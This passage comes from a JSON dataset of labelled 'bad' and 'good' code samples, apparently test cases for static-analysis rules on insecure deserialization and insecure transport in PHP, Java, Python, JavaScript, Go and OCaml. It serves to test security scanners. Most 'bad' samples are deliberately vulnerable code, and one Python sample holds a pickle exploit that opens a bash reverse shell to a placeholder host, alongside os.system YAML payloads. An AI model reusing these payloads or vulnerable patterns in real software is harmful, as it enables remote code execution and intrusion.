    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "<?php\n\n$data = $_GET[\"data\"];\n// ruleid: unserialize-use\n$object = unserialize($data);",
    "language": "php",
    "description": "unserializing user-controlled data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "<?php\n\n// ok: unserialize-use\n$object2 = unserialize('O:1:\"a\":1:{s:5:\"value\";s:3:\"100\";}');",
    "language": "php",
    "description": "use hardcoded or validated data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "<?php\n\n$bad = $_GET['some_param'];\n// ruleid:extract-user-data\nextract($bad, EXTR_PREFIX_SAME, \"wddx\");\necho \"$color, $size, $shape, $wddx_size\\n\";\n\n$bad2 = $_FILES[\"/some/bad/path\"];\n// ruleid:extract-user-data\nextract($bad2, EXTR_PREFIX_SAME, \"wddx\");",
    "language": "php",
    "description": "extracting user-controlled arrays"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "<?php\n\n/* Suppose that $var_array is an array returned from\n   wddx_deserialize */\n\n$size = \"large\";\n$var_array = array(\"color\" => \"blue\",\n                   \"size\"  => \"medium\",\n                   \"shape\" => \"sphere\");\n// ok: extract-user-data\nextract($var_array, EXTR_PREFIX_SAME, \"wddx\");\n\n// ok: extract-user-data\n$ok = $_FILES[\"/some/bad/path\"];\nextract($ok, EXTR_SKIP, \"wddx\");",
    "language": "php",
    "description": "use EXTR_SKIP or trusted data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "<?php\n\n// ruleid: wp-php-object-injection-audit\n$content = unserialize($POST['post_content']);\n\n// ruleid: wp-php-object-injection-audit\n$rank_math=unserialize($rank_value);\n\n// ruleid: wp-php-object-injection-audit\n$import_options = maybe_unserialize($import->options);\n\n// ruleid: wp-php-object-injection-audit\n$data = unserialize(base64_decode($var));",
    "language": "php",
    "description": "using unserialize/maybe_unserialize with untrusted data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "<?php\n\n// ok: wp-php-object-injection-audit\n$data = serialize(base64_encode($var))",
    "language": "php",
    "description": "use serialize for output, not unserialize for input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "// cf. https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/\n\npackage de.mogwailabs.BSidesRMIService;\n\nimport java.rmi.Naming;\nimport java.rmi.registry.LocateRegistry;\n\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\n\n// ruleid:server-dangerous-object-deserialization\npublic interface IBSidesService extends Remote {\n   boolean registerTicket(String ticketID) throws RemoteException;\n   void vistTalk(String talkID) throws RemoteException;\n   void poke(Object attende) throws RemoteException;\n}\n\n// ruleid:server-dangerous-object-deserialization\npublic interface IBSidesService extends Remote {\n   boolean registerTicket(String ticketID) throws RemoteException;\n   void vistTalk(String talkID) throws RemoteException;\n   void poke(StringBuilder attende) throws RemoteException;\n}",
    "language": "java",
    "description": "using Object type in RMI interfaces"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "// ok:server-dangerous-object-deserialization\npublic interface IBSidesServiceOK extends Remote {\n   boolean registerTicket(String ticketID) throws RemoteException;\n   void vistTalk(String talkID) throws RemoteException;\n   void poke(int attende) throws RemoteException;\n}\n\n// ok:server-dangerous-object-deserialization\npublic interface IBSidesServiceOK extends Remote {\n   boolean registerTicket(String ticketID) throws RemoteException;\n   void vistTalk(String talkID) throws RemoteException;\n   void poke(Integer attende) throws RemoteException;\n}",
    "language": "java",
    "description": "use primitive types or Integer"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "// cf. https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/\n\npackage de.mogwailabs.BSidesRMIService;\n\nimport java.rmi.Naming;\nimport java.rmi.registry.LocateRegistry;\n\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\n\n// ruleid:server-dangerous-class-deserialization\npublic interface IBSidesService extends Remote {\n   boolean registerTicket(String ticketID) throws RemoteException;\n   void vistTalk(String talkname) throws RemoteException;\n   void poke(Attendee attende) throws RemoteException;\n}\n\npublic class Attendee {\n    public int id;\n    public String handle;\n}",
    "language": "java",
    "description": "using non-primitive classes in RMI interfaces"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "// ok:server-dangerous-class-deserialization\npublic interface IBSidesServiceOK extends Remote {\n   boolean registerTicket(long ticketID) throws RemoteException;\n   void vistTalk(long talkID) throws RemoteException;\n   void poke(int attende) throws RemoteException;\n}",
    "language": "java",
    "description": "use primitive types"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "package com.rands.couponproject.ejb;\n\nimport java.util.Date;\n\nimport javax.ejb.ActivationConfigProperty;\nimport javax.ejb.EJB;\nimport javax.ejb.MessageDriven;\nimport javax.jms.JMSException;\nimport javax.jms.Message;\nimport javax.jms.MessageListener;\nimport javax.jms.ObjectMessage;\nimport javax.jms.TextMessage;\n\n@MessageDriven(activationConfig = {\n        @ActivationConfigProperty(\n        propertyName = \"destinationType\", propertyValue = \"javax.jms.Queue\"),\n        @ActivationConfigProperty(\n        propertyName = \"destination\", propertyValue = \"java:/jms/queue/MyQueue\")\n        })\npublic class IncomeConsumerBean implements MessageListener {\n\n    public void onMessage(Message message) {\n        try {\n            if (message instanceof ObjectMessage) {\n                ObjectMessage msg = (ObjectMessage) message;\n\n                // ruleid: insecure-jms-deserialization\n                Object o = msg.getObject(); // variant 1 : calling getObject method directly on an ObjectMessage object\n\n                // ruleid: insecure-jms-deserialization\n                Income income = (Income) msg.getObject(); // variant 2 : calling getObject method and casting to a custom class\n            }\n\n        } catch (JMSException e) {\n            // handle exception\n        }\n    }\n}",
    "language": "java",
    "description": "Incorrect (calling getObject() on JMS ObjectMessage) example for Prevent Insecure Deserialization"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "import org.yaml.snakeyaml.Yaml;\nimport org.yaml.snakeyaml.constructor.SafeConstructor;\n\npublic class SnakeYamlTestCase {\n    public void unsafeLoad(String toLoad) {\n        // ruleid:use-snakeyaml-constructor\n        Yaml yaml = new Yaml();\n        yaml.load(toLoad);\n    }\n}",
    "language": "java",
    "description": "Incorrect (using Yaml() without SafeConstructor) example for Prevent Insecure Deserialization"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "import org.yaml.snakeyaml.Yaml;\nimport org.yaml.snakeyaml.constructor.SafeConstructor;\n\npublic class SnakeYamlTestCase {\n    public void safeConstructorLoad(String toLoad) {\n        // ok:use-snakeyaml-constructor\n        Yaml yaml = new Yaml(new SafeConstructor());\n        yaml.load(toLoad);\n    }\n\n    public void customConstructorLoad(String toLoad, Class goodClass) {\n        // ok:use-snakeyaml-constructor\n        Yaml yaml = new Yaml(new Constructor(goodClass));\n        yaml.load(toLoad);\n    }\n}",
    "language": "java",
    "description": "use SafeConstructor or custom Constructor"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "private class Car {\n    private Fake variable;\n\n    @JsonTypeInfo(use = Id.CLASS)\n    private Object color;\n    private String type;\n\n    public static void main(String[] args) throws JsonGenerationException, JsonMappingException, IOException {\n        ObjectMapper objectMapper = new ObjectMapper();\n        objectMapper.enableDefaultTyping();\n\n        try {\n            // ruleid: jackson-unsafe-deserialization\n            Car car = objectMapper.readValue(Paths.get(\"target/payload.json\").toFile(), Car.class);\n            System.out.println((car.getColor()));\n        } catch (Exception e) {\n            System.out.println(\"Exception raised:\" + e.getMessage());\n        }\n\n    }\n}\n\n// Additional class to test rule when ObjectMapper is created in a different method\n@RestController\npublic class MyController {\n    private ObjectMapper objectMapper;\n\n    @PostConstruct\n    public void initialize() {\n        objectMapper = new ObjectMapper();\n        objectMapper.enableDefaultTyping();\n    }\n\n    @RequestMapping(path = \"/vulnerable\", method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_VALUE)\n    public GenericUser vulnerable(@CookieValue(name = \"token\", required = false) String token) {\n        byte[] decoded = Base64.getDecoder().decode(token);\n        String decodedString = new String(decoded);\n        // ruleid: jackson-unsafe-deserialization\n        Car obj = objectMapper.readValue(\n                decodedString,\n                Car.class);\n        return obj;\n    }\n}",
    "language": "java",
    "description": "using enableDefaultTyping with Object fields"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "public static void anotherMain2(String[] args) throws JsonGenerationException, JsonMappingException, IOException {\n    ObjectMapper objectMapper = new ObjectMapper();\n\n    try {\n        // ok: jackson-unsafe-deserialization\n        Car car = objectMapper.readValue(Paths.get(\"target/payload.json\").toFile(), Another.class);\n        System.out.println((car.getColor()));\n    } catch (Exception e) {\n        System.out.println(\"Exception raised:\" + e.getMessage());\n    }\n\n}",
    "language": "java",
    "description": "avoid enableDefaultTyping and Object fields"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "package deserialize;\n\nimport java.io.InputStream;\nimport java.io.ObjectInputStream;\nimport java.io.IOException;\nimport java.lang.ClassNotFoundException;\n\nimport com.biz.org.UserData;\n\npublic class Cls\n{\n    public UserData deserializeObject(InputStream receivedFile) throws IOException, ClassNotFoundException {\n        // ruleid:object-deserialization\n        ObjectInputStream in = new ObjectInputStream(receivedFile);\n        return (UserData) in.readObject();\n    }\n\n    public UserData deserializeObject(InputStream receivedFile) throws IOException, ClassNotFoundException {\n        // ruleid:object-deserialization\n        try (ObjectInputStream in = new ObjectInputStream(receivedFile)) {\n            return (UserData) in.readObject();\n        } catch (IOException e) {\n            throw e;\n        }\n    }\n}",
    "language": "java",
    "description": "using ObjectInputStream to deserialize objects"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "package unsafe.jaxrs;\n\nimport java.util.*;\nimport javax.ws.rs.*;\nimport javax.ws.rs.core.*;\n\n@Path(\"/\")\npublic class PoC_resource {\n  @POST\n  @Path(\"/concat\")\n  @Produces(MediaType.APPLICATION_JSON)\n  // ruleid: insecure-resteasy-deserialization\n  @Consumes({ \"*/*\" })\n  public Map<String, String> doConcat(Pair pair) {\n    HashMap<String, String> result = new HashMap<String, String>();\n    result.put(\"Result\", pair.getP1() + pair.getP2());\n\n    return result;\n  }\n\n  // ruleid:default-resteasy-provider-abuse\n  @POST\n  @Path(\"/vulnerable\")\n  @Produces(MediaType.APPLICATION_JSON)\n  public Map<String, String> doConcat(Pair pair) {\n    HashMap<String, String> result = new HashMap<String, String>();\n    result.put(\"Result\", pair.getP1() + pair.getP2());\n\n    return result;\n  }\n}",
    "language": "java",
    "description": "using wildcard @Consumes or missing @Consumes"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "package unsafe.jaxrs;\n\nimport java.util.*;\nimport javax.ws.rs.*;\nimport javax.ws.rs.core.*;\n\n@Path(\"/\")\npublic class PoC_resource {\n  @POST\n  @Path(\"/count\")\n  @Produces(MediaType.APPLICATION_JSON)\n  // ok: insecure-resteasy-deserialization\n  @Consumes(MediaType.APPLICATION_JSON)\n  public Map<String, Integer> doCount(ArrayList<Object> elements) {\n    HashMap<String, Integer> result = new HashMap<String, Integer>();\n    result.put(\"Result\", elements.size());\n\n    return result;\n  }\n\n  // ok: default-resteasy-provider-abuse\n  @GET\n  @Path(\"/tenantmode\")\n  @Produces(MediaType.TEXT_PLAIN)\n  public String getTenantMode() {\n    return kubernetesService.getMessage();\n  }\n\n}\n\n@Path(\"/\")\n@Consumes(MediaType.APPLICATION_JSON)\n@Produces(MediaType.APPLICATION_JSON)\npublic class PoC_resource {\n\n  // ok: default-resteasy-provider-abuse\n  @POST\n  @Path(\"/concat\")\n  public Map<String, String> doConcat(Pair pair) {\n    HashMap<String, String> result = new HashMap<String, String>();\n    result.put(\"Result\", pair.getP1() + pair.getP2());\n    return result;\n  }\n\n}",
    "language": "java",
    "description": "use specific MediaType in @Consumes"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "from django.http import HttpResponse\nimport datetime\n\ndef current_datetime(request):\n    user_obj = b64decode(request.cookies.get('uuid'))\n    now = datetime.datetime.now()\n    html = \"<html><body>It is now %s.</body></html>\" % now\n\n    # ruleid:avoid-insecure-deserialization\n    return \"Hey there! {}!\".format(pickle.loads(user_obj))\n\ndef current_datetime(request):\n    user_obj = request.cookies.get('uuid')\n    now = datetime.datetime.now()\n    html = \"<html><body>It is now %s.</body></html>\" % now\n\n    # ruleid:avoid-insecure-deserialization\n    return \"Hey there! {}!\".format(pickle.loads(user_obj))\n\ndef current_datetime(request):\n    user_obj = request.cookies.get('uuid')\n    # ruleid:avoid-insecure-deserialization\n    return \"Hey there! {}!\".format(pickle.loads(b64decode(user_obj)))\n\ndef current_datetime(request):\n    # ruleid:avoid-insecure-deserialization\n    return \"Hey there! {}!\".format(pickle.loads(b64decode(request.cookies.get('uuid'))))\n\ndef current_datetime(request):\n    user_obj = b64decode(request.cookies.get('uuid'))\n    # ruleid:avoid-insecure-deserialization\n    return \"Hey there! {}!\".format(_pickle.loads(user_obj))\n\ndef current_datetime(request):\n    user_obj = request.cookies.get('uuid')\n    # ruleid:avoid-insecure-deserialization\n    return \"Hey there! {}!\".format(cPickle.loads(user_obj))\n\ndef current_datetime(request):\n    user_obj = request.cookies.get('uuid')\n    # ruleid:avoid-insecure-deserialization\n    return \"Hey there! {}!\".format(dill.loads(b64decode(user_obj)))\n\ndef current_datetime(request):\n    user_obj = request.cookies.get('uuid')\n    # ruleid:avoid-insecure-deserialization\n    return \"Hey there! {}!\".format(shelve.loads(user_obj))\n\ndef current_datetime(request):\n    user_obj = request.cookies.get('uuid')\n    # ruleid:avoid-insecure-deserialization\n    return \"Hey there! {}!\".format(yaml.load(b64decode(user_obj)))",
    "language": "python",
    "description": "using pickle/dill/shelve/yaml with request data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "from django.http import HttpResponse\nimport datetime\n\ndef current_datetime(request):\n    user_obj = request.cookies.get('uuid')\n    now = datetime.datetime.now()\n    html = \"<html><body>It is now %s.</body></html>\" % now\n\n    # ok:avoid-insecure-deserialization\n    return \"Hey there! {}!\".format(pickle.loads(b64decode(html)))",
    "language": "python",
    "description": "use safe data sources"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "# Import dependencies\nimport os\nimport _pickle\n\n# Attacker prepares exploit that application will insecurely deserialize\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, (\"whoami\",))\n\n\n# Attacker serializes the exploit\ndef serialize_exploit():\n    # ruleid: avoid-pickle\n    shellcode = _pickle.dumps(Exploit())\n    return shellcode\n\n\n# Application insecurely deserializes the attacker's serialized data\ndef insecure_deserialization(exploit_code):\n    # ruleid: avoid-pickle\n    _pickle.loads(exploit_code)\n\n\n# Application insecurely deserializes the attacker's serialized data\ndef insecure_deserialization_2(exploit_code):\n    import _pickle as adaasfa\n\n    # ruleid: avoid-pickle\n    adaasfa.loads(exploit_code)\n\n\nimport cPickle\nimport socket\n\n\nclass Shell_code(object):\n    def __reduce__(self):\n        return (\n            os.system,\n            ('/bin/bash -i >& /dev/tcp/\"Client IP\"/\"Listening PORT\" 0>&1',),\n        )\n\n\n# ruleid: avoid-cPickle\nshell = cPickle.dumps(Shell_code())\n\nimport dill\n\n# ruleid: avoid-dill\nshell = dill.dumps(Shell_code())\n\nimport shelve\n\n# ruleid: avoid-shelve\nmyShelve = shelve.open(Shell_code())",
    "language": "python",
    "description": "using pickle-based libraries"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "import yaml\n\n\n#ruleid:avoid-pyyaml-load\nyaml.unsafe_load(\"!!python/object/new:os.system [echo EXPLOIT!]\")\n\ndef thing(**kwargs):\n    #ruleid:avoid-pyyaml-load\n    yaml.unsafe_load(\"!!python/object/new:os.system [echo EXPLOIT!]\", **kwargs)\n\ndef other_thing(**kwargs):\n    #ruleid:avoid-pyyaml-load\n    yaml.load(\"!!python/object/new:os.system [echo EXPLOIT!]\", Loader=yaml.Loader, **kwargs)\n\ndef other_thing_two(**kwargs):\n    #ruleid:avoid-pyyaml-load\n    yaml.load(\"!!python/object/new:os.system [echo EXPLOIT!]\", Loader=yaml.UnsafeLoader, **kwargs)\n\ndef other_thing_three(**kwargs):\n    #ruleid:avoid-pyyaml-load\n    yaml.load(\"!!python/object/new:os.system [echo EXPLOIT!]\", Loader=yaml.CLoader, **kwargs)\n\ndef other_thing_four(**kwargs):\n    #ruleid:avoid-pyyaml-load\n    yaml.load_all(\"!!python/object/new:os.system [echo EXPLOIT!]\", Loader=yaml.Loader, **kwargs)\n\ndef other_thing_five(**kwargs):\n    #ruleid:avoid-pyyaml-load\n    yaml.load_all(\"!!python/object/new:os.system [echo EXPLOIT!]\", Loader=yaml.UnsafeLoader, **kwargs)\n\ndef other_thing_six(**kwargs):\n    #ruleid:avoid-pyyaml-load\n    yaml.load_all(\"!!python/object/new:os.system [echo EXPLOIT!]\", Loader=yaml.CLoader, **kwargs)",
    "language": "python",
    "description": "using unsafe YAML loaders"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "import yaml\n\ndef this_is_ok(stream):\n    #ok:avoid-pyyaml-load\n    return yaml.load(stream, Loader=yaml.CSafeLoader)\n\ndef this_is_also_ok(stream):\n    #ok:avoid-pyyaml-load\n    return yaml.load(stream, Loader=yaml.SafeLoader)\n\ndef this_is_additionally_ok(stream):\n    #ok:avoid-pyyaml-load\n    return yaml.load_all(stream, Loader=yaml.CSafeLoader)\n\ndef this_is_ok_too(stream):\n    #ok:avoid-pyyaml-load\n    return yaml.load_all(stream, Loader=yaml.SafeLoader)\n\ndef this_is_ok_as_well(stream):\n    #ok:avoid-pyyaml-load\n    return yaml.load(stream, Loader=yaml.BaseLoader)\n\ndef this_is_ok_too_two(stream):\n    #ok:avoid-pyyaml-load\n    return yaml.load_all(stream, Loader=yaml.BaseLoader)\n\ndef check_ruamel_yaml():\n    from ruamel.yaml import YAML\n    yaml = YAML(typ=\"rt\")\n    # ok:avoid-pyyaml-load\n    yaml.load(\"thing.yaml\")\n    # ok:avoid-pyyaml-load\n    yaml.load_all(\"thing.yaml\")",
    "language": "python",
    "description": "use SafeLoader or CSafeLoader"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "from ruamel.yaml import YAML\n\n#ruleid:avoid-unsafe-ruamel\ny3 = YAML(typ='unsafe')\n\n#ruleid:avoid-unsafe-ruamel\ny4 = YAML(typ='base')",
    "language": "python",
    "description": "using unsafe typ parameter"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "from ruamel.yaml import YAML\n\n#ok:avoid-unsafe-ruamel\ny1 = YAML()  # default is 'rt'\n\n#ok:avoid-unsafe-ruamel\ny2 = YAML(typ='rt')\n\n#ok:avoid-unsafe-ruamel\ny3 = YAML(typ='safe')",
    "language": "python",
    "description": "use default 'rt' or 'safe' typ"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "import jsonpickle\n\ndef run_payload(payload: str) -> None:\n    # ruleid: avoid-jsonpickle\n    obj = jsonpickle.decode(payload)",
    "language": "python",
    "description": "using jsonpickle.decode with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "import jsonpickle\n\ndef ok():\n    # ok: avoid-jsonpickle\n    obj = jsonpickle.decode('foobar')",
    "language": "python",
    "description": "use hardcoded strings"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "import marshal\n\nfin = open('index.mar')\nfor line in fin:\n    # ruleid: marshal-usage\n    marshal.dumps(line)",
    "language": "python",
    "description": "using marshal.dumps/loads"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "import multiprocessing\nimport multiprocessing.connection\n\n\nrx = multiprocessing.connection.Client(('localhost', 12345)).recv()\n\n# ruleid: multiprocessing-recv\nconnection = multiprocessing.connection.Client(\n    ('localhost', 12345),\n)\n\noutput = {}\nconnection.send(output)\n\n# toodoruleid:multiprocessing.recv\nrx = connection.recv()",
    "language": "python",
    "description": "Incorrect (using Connection.recv() without authentication) example for Prevent Insecure Deserialization"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "# flask_app.py\nimport os\nimport pickle\nfrom uuid import uuid1\nfrom flask import Flask, make_response, request\nfrom base64 import b64encode, b64decode\n\nclass UserID:\n    def __init__(self, uuid=None):\n        self.uuid = str(uuid1())\n    def __str__(self):\n        return self.uuid\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET'])\ndef index():\n    user_obj = request.cookies.get('uuid')\n    if user_obj == None:\n        msg = \"Seems like you didn't have a cookie. No worries! I'll set one now!\"\n        response = make_response(msg)\n        user_obj = UserID()\n        # ruleid:insecure-deserialization\n        response.set_cookie('uuid', b64encode(pickle.dumps(user_obj)))\n        return response\n    else:\n        # ruleid:insecure-deserialization\n        return \"Hey there! {}!\".format(pickle.loads(b64decode(user_obj)))",
    "language": "python",
    "description": "using pickle in Flask routes"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "@app.route(\"/ok\")\ndef ok():\n    # ok:insecure-deserialization\n    novellist = pickle.load(open('./novel/list.dat', \"rb\"))",
    "language": "python",
    "description": "load from trusted file sources"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "import _pickle\nimport cPickle\nfrom dill import loads\nimport shelve\n\n\ndef lambda_handler(event, context):\n\n  # ruleid: tainted-pickle-deserialization\n  _pickle.load(event['exploit_code'])\n\n  # ruleid: tainted-pickle-deserialization\n  obj = cPickle.loads(f\"foobar{event['exploit_code']}\")\n\n  # ruleid: tainted-pickle-deserialization\n  loads(event['exploit_code'])(123)\n\n  # ruleid: tainted-pickle-deserialization\n  with shelve.open(f\"/tmp/path/{event['object_path']}\") as db:\n    db['eggs'] = 'eggs'",
    "language": "python",
    "description": "deserializing Lambda event data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "good",
    "code": "def lambda_handler(event, context):\n\n  # ok: tainted-pickle-deserialization\n  _pickle.loads('hardcoded code')\n\n  # ok: tainted-pickle-deserialization\n  code = '/file/path'\n  cPickle.load(code)\n\n  # ok: tainted-pickle-deserialization\n  name = 'foobar'\n  shelve.open(f\"/tmp/path/{name}\")",
    "language": "python",
    "description": "use hardcoded or safe data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "package uhoh\n\nimport (\n\t\"context\"\n\t\"net\"\n\t\"net/http\"\n\t\"net/http/httptrace\"\n)\n\nfunc WithTrace(req *http.Request, trace *httptrace.ClientTrace) *http.Request {\n    // ruleid: dynamic-httptrace-clienttrace\n\treturn req.WithContext(httptrace.WithClientTrace(req.Context(), trace))\n}",
    "language": "go",
    "description": "using dynamic ClientTrace"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Insecure Deserialization",
    "type": "bad",
    "code": "(* ruleid:ocamllint-marshal *)\nlet d = input_value stdin in\n  Printf.printf \"%d\\n\" (Buffer.length d)",
    "language": "ocaml",
    "description": "using Marshal.input_value"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "const http = require('http');\n\nfunction bad_http() {\n    // ruleid: http-request\n    http.get('http://nodejs.org/dist/index.json', (res) => {\n    const { statusCode } = res;})\n\n    // ruleid: http-request\n    const options = {\n        port: 80,\n        hostname: 'www.google.com',\n        path: '/upload'\n    }\n\n    const req = http.request(options, (res) => {\n    console.log(`STATUS: ${res.statusCode}`);})\n\n    // ruleid: http-request\n    const options = new URL('http://abc:xyz@example.com');\n\n    const req = http.request(options, (res) => {\n    });\n}",
    "language": "javascript",
    "description": "HTTP requests without TLS"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "const https = require('https');\n\nfunction ok_http() {\n    // ok: http-request\n    https.get('https://nodejs.org/dist/index.json', (res) => {\n    const { statusCode } = res;})\n\n    // ok: http-request\n    const options = {\n        port: 443,\n        hostname: 'www.google.com',\n        path: '/upload',\n        protocol: 'https'\n    }\n\n    const req = https.request(options, (res) => {\n    console.log(`STATUS: ${res.statusCode}`);})\n}",
    "language": "javascript",
    "description": "HTTPS requests with TLS"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "function bad_tls1() {\n    // ruleid: bypass-tls-verification\n    process.env[\"NODE_TLS_REJECT_UNAUTHORIZED\"] = 0;\n}\n\nfunction bad_tls2() {\n    // ruleid: bypass-tls-verification\n    var req = https.request({\n      host: '192.168.1.1',\n      port: 443,\n      path: '/',\n      method: 'GET',\n      rejectUnauthorized: false,\n      requestCert: true,\n      agent: false\n    });\n\n    // ruleid: bypass-tls-verification\n    var client = new RpcClient({\n      user: 'user',\n      pass: 'pass',\n      host: 'localhost',\n      port: 8332,\n      rejectUnauthorized: false,\n      disableAgent: true\n    });\n}\n\n// ruleid: bypass-tls-verification\nrequire('request').defaults({method: 'GET', rejectUnauthorized: false, requestCert: true})",
    "language": "javascript",
    "description": "disabled TLS verification"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "function ok_tls1() {\n    // ok: bypass-tls-verification\n    var req = https.request({\n      host: '192.168.1.1',\n      port: 443,\n      path: '/',\n      method: 'GET',\n      rejectUnauthorized: true,\n      requestCert: true,\n      agent: false\n    });\n}\n\nfunction ok_tls2() {\n    // ok: bypass-tls-verification\n    var req = https.request({\n      host: '192.168.1.1',\n      port: 443,\n      path: '/',\n      method: 'GET',\n      requestCert: true,\n      agent: false\n    });\n}",
    "language": "javascript",
    "description": "TLS verification enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "const https = require('https');\n\nfunction bad1() {\n    const consts = require('crypto');\n    // ruleid: disallow-old-tls-versions1\n    https.createServer({\n        secureOptions: consts.SSL_OP_NO_TLSv1 | consts.SSL_OP_NO_SSLv3\n    }, app).listen(443);\n}\n\nfunction bad2() {\n    const consts = require('crypto');\n    // ruleid: disallow-old-tls-versions1\n    https.createServer({\n        secureOptions: consts.SSL_OP_NO_TLSv1\n    }, app).listen(443);\n}",
    "language": "javascript",
    "description": "weak TLS versions allowed"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "const https = require('https');\n\nfunction ok1() {\n    const constants = require('crypto');\n    // ok: disallow-old-tls-versions1\n    https.createServer({\n        secureOptions: constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_SSLv2\n    }, app).listen(443);\n}",
    "language": "javascript",
    "description": "all weak TLS versions disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "import axios from 'axios';\n\n// ruleid: react-insecure-request\nfetch('http://www.example.com', 'GET', {})\n\nlet addr = \"http://www.example.com\"\n// ruleid: react-insecure-request\nfetch(addr, 'POST', {})\n\n// ruleid: react-insecure-request\naxios.get('http://www.example.com');\n\n// ruleid: react-insecure-request\nconst options = {\n  method: 'POST',\n  headers: { 'content-type': 'application/x-www-form-urlencoded' },\n  data: qs.stringify(data),\n  url: 'http://www.example.com',\n};\naxios(options);\n\n// ruleid: react-insecure-request\naxios({ method: 'POST', url: 'http://www.example.com' });",
    "language": "typescript",
    "description": "unencrypted HTTP requests"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "import axios from 'axios';\n\n// ok: react-insecure-request\nfetch('https://www.example.com', 'GET', {})\n\n// ok: react-insecure-request\naxios.get('https://www.example.com');\n\n// ok: react-insecure-request\nconst options = {\n  method: 'POST',\n  url: 'https://www.example.com',\n};\naxios(options);",
    "language": "typescript",
    "description": "HTTPS requests"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "func bad1() {\n    // ruleid: http-request\n    resp, err := http.Get(\"http://example.com/\")\n    // ruleid: http-request\n    resp, err := http.Post(\"http://example.com/\", val, val)\n    // ruleid: http-request\n    resp, err := http.Head(\"http://example.com/\")\n    // ruleid: http-request\n    resp, err := http.PostForm(\"http://example.com/\", form)\n}\n\nfunc bad2() {\n    client := &http.Client{\n        CheckRedirect: redirectPolicyFunc,\n    }\n\n    // ruleid: http-request\n    resp, err := client.Get(\"http://example.com\")\n}",
    "language": "go",
    "description": "HTTP requests without TLS"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
